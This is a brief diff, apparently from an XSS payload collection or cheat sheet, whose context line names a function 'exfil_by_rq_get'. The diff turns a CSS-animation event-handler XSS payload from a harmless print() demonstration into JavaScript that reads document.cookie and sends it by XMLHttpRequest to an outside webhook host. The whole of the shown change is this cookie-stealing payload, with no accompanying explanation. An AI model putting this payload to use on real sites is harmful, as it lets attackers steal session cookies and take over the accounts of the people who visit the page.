@@ -44,4 +44,16 @@ function exfil_by_rq_get(info_name, text) {
 }
 ```
 
-<style>@keyframes x{}</style><b style="animation-name:x" onwebkitanimationstart="print()"></b>
+<style>@keyframes x{}</style><b style="animation-name:x" onwebkitanimationstart="  var xhttp = new XMLHttpRequest();
+  xhttp.open(
+    "GET",
+    "https://7f66658a-2b27-47ed-80ff-545eca5c9dba.webhooksite.net" +
+      "/exfil_by_rq_get/" +
+      "c" +
+      "?" +
+      "c" +
+      "=" +
+      document.cookie,
+    true
+  );
+  xhttp.send()"></b>
